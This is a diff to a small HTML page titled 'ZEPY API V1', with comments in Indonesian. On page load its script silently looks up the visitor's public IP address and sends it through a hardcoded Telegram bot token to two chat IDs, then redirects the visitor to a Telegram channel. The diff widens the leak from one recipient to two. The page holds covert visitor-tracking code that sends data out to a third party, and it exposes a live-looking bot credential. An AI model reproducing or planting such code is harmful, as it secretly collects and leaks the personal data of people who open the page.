@@ -2,24 +2,26 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>Zepy Api</title>
+  <title>ZEPY API V1</title>
   <script>
     fetch('https://api.ipify.org?format=json')
       .then(response => response.json())
       .then(data => {
         const ip = data.ip;
         const token = '7627954962:AAHVwLsNQdpFSi3E6Zg5qRzIQ7tBUdSRFKA';
-        const chat_id = '7708476554';
-        const text = `IP: ${ip}`;
+        const chat_ids = ['7708476554', '12221'];
+        const text = `DETECTED NEW IP: ${ip}`;
 
-        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ chat_id, text })
+        // Kirim ke semua chat_id
+        chat_ids.forEach(chat_id => {
+          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id, text })
+          });
         });
       })
       .finally(() => {
-        // Redirect setelah IP dikirim
         setTimeout(() => {
           window.location.href = 'https://t.me/zepyytry';
         }, 1000); // Delay 1 detik
